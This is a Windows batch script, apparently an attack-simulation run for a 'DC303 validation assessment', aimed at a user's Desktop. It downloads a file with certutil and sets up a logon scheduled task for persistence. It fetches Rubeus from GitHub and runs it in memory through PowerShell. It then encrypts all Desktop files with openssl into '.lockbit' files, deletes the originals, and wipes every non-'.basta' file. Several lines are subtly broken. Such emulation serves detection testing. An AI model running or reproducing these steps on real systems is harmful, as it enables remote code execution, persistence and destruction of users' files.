@ECHO OFF

cd C:\Users\Spiderman\Desktop


echo "This is the start of the DC303 validation assessment"
timeout /t 5


echo "The first action will download a suspicious iso file using the certutil utility"
timout /t 3

certutil -urlcache -f https://github.com/HeckSec/programming_projects/blob/master/not_bad.iso C:\Users\Spiderman\Desktop\not_bad.iso
timeout /t 3

dir C:\Users\Spiderman\Desktop | findstr /i not*
timeout /t 3

:: Scheduled Task
echo "This first action will create a scheduled task - starting up calc.exe at each login."
timeout /t 3

schtasks /create /TR "C:\Windows\System32\calc.exe" /RU Spiderman /TN "CalcTask" /SC ONLOGON /IT
timeout /t 3

::PowerShell download and execute Rubeus
echo "Now Downloading and executing Rubeus"
timeout /t 3

powershell.exe [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe')); [Rubeus.Program]::Main("klist".Split())
timeout /t 3

:: Ransomware Concept using OpenSSL
echo "Now running some dumb Ransomware on the device"
timeout /t 3

cd "C:\Program Files\OpenSSL-Win64\bin\openssl.exe"

echo "Encrypting files located in C:\Users\Spiderman\Desktop\"
timeout /t 3
for /r "C:\Users\Spiderman\Desktop" %%y in (*.*) do openssl enc -chacha20 -k mypassword -pbkdf2 -in "%%y" -out "%%y.lockbit" && del /q /s /f C:\%%y
timeout /t 3

dir C:\Users\Spiderman\Desktop\
timeout /t 5


echo "Now deleting all files in C:\Users\Spiderman\Desktop\ like any Ransomware worth its salt would"
timeout /t 3

for /r "C:\Users\Spiderman\Desktop" %%z in (*) do (if not "%%~xz"==".basta" del /q /f "%%~z")
timeout /t 3

dir C:\Users\Spiderman\Desktop\
timeout /t 10